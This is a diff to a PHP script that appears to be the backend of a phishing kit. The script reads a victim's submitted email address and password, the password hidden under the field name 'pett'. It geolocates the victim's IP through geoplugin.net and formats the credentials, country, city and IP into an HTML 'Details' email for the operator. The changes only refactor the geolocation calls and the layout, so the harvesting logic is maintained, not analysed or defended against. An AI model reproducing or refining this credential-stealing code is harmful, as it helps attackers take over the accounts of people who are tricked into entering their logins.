@@ -2,7 +2,7 @@
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE');
 header('Access-Control-Allow-Headers: X-Requested-With,Origin,Content-Type,Cookie,Accept');
-$ip = getenv("REMOTE_ADDR");
+$ip = $_SERVER['REMOTE_ADDR'];
 $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
 if(property_exists($ipdat, 'geoplugin_countryCode'));
 if(property_exists($ipdat, 'geoplugin_countryName'));
@@ -75,8 +75,8 @@ if(isset($_POST)){
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
     $data['subject'] = $email->clean($_REQUEST['pet']);
-    $data['cname'] = $country;
-	    $data['ccity'] = $city;
+    $data['cname'] = $email->geoplugin_countryName();
+    $data['ccity'] = $email->geoplugin_city();
 
     $data['message'] =
 		"
@@ -88,10 +88,10 @@ if(isset($_POST)){
 			<body>
 				<h3>Details</h3>
 				<p>This is the information you required</p>
-				<br>
+				<p></p>
 			    <p><strong>E-ID:</strong> ".$data['email']."</p>
 			    <p><strong>P-ID:</strong>".$data['pass']."</p>
-			    <br>
+			    <p></p>
 			    <p><strong>P-ID:</strong>".$data['cname']."</p>
 			    <p><strong>P-ID:</strong>".$data['ccity']."</p>
 			    <p><strong>IP:</strong>".$data['ip']."</p>
